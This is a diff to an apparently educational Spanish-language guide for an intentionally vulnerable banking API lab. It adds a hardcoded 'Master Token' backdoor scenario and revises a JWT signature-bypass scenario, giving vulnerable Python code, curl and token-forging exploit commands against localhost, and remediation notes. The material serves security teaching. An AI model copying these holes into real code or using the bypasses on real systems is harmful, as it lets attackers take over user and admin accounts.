@@ -73,11 +73,46 @@ curl -s http://localhost:8080/api/accounts/ \
 
 ## 2. 🔓 Broken Authentication — API2:2023
 
+**Qué es:** El mecanismo de autenticación sufre de dos fallas críticas documentadas en el OWASP API Top 10: un "backdoor" dejado intencionalmente por los programadores, y una validación de firmas JWT rota.
+
+### 🐛 Escenario 2A: Hardcoded Backdoor (Fácil)
+
+**Qué es:** Los desarrolladores dejaron un "Master Token" grabado (hardcodeado) en el código fuente para facilitar sus pruebas, pero lo olvidaron en producción.
+
+**Impacto bancario:** Si alguien descubre este token, obtiene acceso total inmediato como administrador.
+
+#### 🔍 Código vulnerable del backend
+
+```python
+# app/auth.py
+def get_current_user(authorization: Optional[str] = Header(None)) -> dict:
+    if not authorization:
+        raise HTTPException(status_code=401, detail="Authorization header required")
+
+    # ❌ VULN: Backdoor intencional para los desarrolladores
+    if authorization == "Bearer novapay_dev_2024":
+        return {"user_id": 1, "username": "admin", "role": "admin"}
+```
+
+#### Explotación
+
+Es tan fácil como enviar ese texto exacto como Header.
+
+```bash
+# Entrar como administrador sin necesidad de usuario, clave ni JWT.
+curl -s http://localhost:8080/api/users/me \
+  -H "Authorization: Bearer novapay_dev_2024" | python3 -m json.tool
+```
+
+**Remediación:** Nunca dejar credenciales, tokens globales ni backdoors (código de depuración) en ramas de producción.
+
+---
+
+### 🐛 Escenario 2B: JWT Signature Bypass (Avanzado)
+
 **Qué es:** La API implementa validación de JWT, pero tiene un fallo lógico: si la firma es inválida, el servidor captura el error e intenta decodificar el token *sin verificar la firma* usando `options={"verify_signature": False}`.
 
-**Impacto bancario:** Un atacante puede forjar tokens para cualquier usuario (incluyendo administradores) firmándolos con cualquier clave basura, ya que el servidor ignorará la firma.
-
-### 🔍 Código vulnerable del backend
+#### 🔍 Código vulnerable del backend
 
 ```python
 # app/auth.py
@@ -93,7 +128,7 @@ def decode_token(token):
             return payload
 ```
 
-### Explotación — JWT Signature Bypass
+#### Explotación — Forjar Token
 
 No necesitamos conocer la palabra secreta del servidor. Podemos firmar el token con una clave falsa (ej: `basura123`), la firma será inválida, pero el backend lo aceptará igual.
 
@@ -108,12 +143,12 @@ print(token)
 
 echo "Token forjado: $FORGED"
 
-# 2. Usar el token forjado para acceder al endpoint de admin
-curl -s http://localhost:8080/api/admin/stats \
+# 2. Usar el token forjado para acceder al perfil de admin y ver su password real
+curl -s http://localhost:8080/api/users/me \
   -H "Authorization: Bearer $FORGED" | python3 -m json.tool
 ```
 
-**Remediación:** Nunca usar `verify_signature: False` en producción. Si `InvalidSignatureError` ocurre, la solicitud debe ser rechazada inmediatamente con un 401 Unauthorized.
+**Remediación:** Nunca usar `verify_signature: False` en producción. Si ocurre una excepción de firma, la solicitud debe ser rechazada inmediatamente.
 
 ---
 
